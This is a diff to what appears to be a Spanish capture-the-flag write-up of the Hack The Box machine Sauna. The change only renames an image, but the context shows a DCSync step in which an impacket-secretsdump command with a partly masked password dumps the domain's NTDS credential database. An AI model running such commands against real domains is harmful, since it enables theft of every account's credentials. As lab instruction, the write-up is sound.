@@ -255,7 +255,8 @@ INFO: Found 0 trusts
 
 ### Aprovechando DCSync
 Al ver los permisos del usuario svc_loanmgr, se puede ver que tiene permisos dcsync sobre el dominio, por lo que aprovechando ese permiso de procede a dumpear toda la base de datos NTDS.
-![](sauna2.jpg)
+
+![](sauna2.JPG)
 ~~~
 impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Mo<SNIP>d!'@10.10.10.175
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
